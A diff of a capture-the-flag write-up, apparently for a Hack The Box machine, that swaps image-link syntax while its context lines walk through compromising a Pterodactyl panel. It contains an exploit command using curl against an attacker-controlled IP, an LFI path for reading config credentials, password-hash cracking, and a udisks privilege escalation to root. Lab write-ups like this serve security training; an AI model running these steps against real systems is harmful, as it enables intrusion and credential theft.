@@ -36,7 +36,7 @@ Public                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 5
 ```
 
 changelog.txt 
-![[Pasted image 20260212000816.png]]
+<img src="assets/Pasted image 20260212000816.png">
 Pterodactyl panel v1.11.10 
 
 ##### Gobuster (subdomain)
@@ -53,7 +53,7 @@ Progress: 1363 / 4989 (27.32%)
 
 ```
 
-![[Pasted image 20260211233933.png]]
+<img src="assets/Pasted image 20260211233933.png">
 
 this [CVE-2025-49132](https://github.com/YoyoChaud/CVE-2025-49132) wont work alone , u need to round it up somehow. 
 
@@ -85,7 +85,7 @@ python3 ape1.py --host panel.pterodactyl.htb --command "curl http://10.10.14.56:
 ```
 
 cute
-![[Pasted image 20260211235231.png]]
+<img src="assets/Pasted image 20260211235231.png">
 
 # Post exploitation
 earlier we said that we had an LFI on the `/locales/locale.json?&locale=../../../../../Pterodactyl&namespace=config/app`, i fuzzed the config/app which revealed the database creds. which they are on the environment anyway 
@@ -100,12 +100,12 @@ DB_DATABASE=panel
 
 connect to the database 
 
-![[Pasted image 20260211235704.png]]
+<img src="assets/Pasted image 20260211235704.png">
 users table 
-![[Pasted image 20260211235723.png]]
+<img src="assets/Pasted image 20260211235723.png">
 
 hashes !!! 
-![[Pasted image 20260212000143.png]]
+<img src="assets/Pasted image 20260212000143.png">
 
 we can crack `phileasfogg3` hash ..and we get 
 ```
@@ -118,7 +118,7 @@ now we can SSH
 
 the `expiry` was a rabbithole .. also the crontab .. they tricked us but theres a  hint inthe mail saying that udisk is acting weird 
 
-![[Pasted image 20260215155855.png]]
+<img src="assets/Pasted image 20260215155855.png">
 
 theres an exploit for that [CVE-2025-6018](https://github.com/ibrahmsql/CVE-2025-6018) and  [CVE-2025-6019](https://github.com/guinea-offensive-security/CVE-2025-6019)
 in order for the exploit to run u need to read carefully BOTH of the CVEs 
@@ -185,5 +185,5 @@ gdbus call --system --dest org.freedesktop.UDisks2 \
 ```
 
 ##### Verify root
-![[Pasted image 20260212000719.png]]
+<img src="assets/Pasted image 20260212000719.png">
 we are part of the root group so we can say we did it 
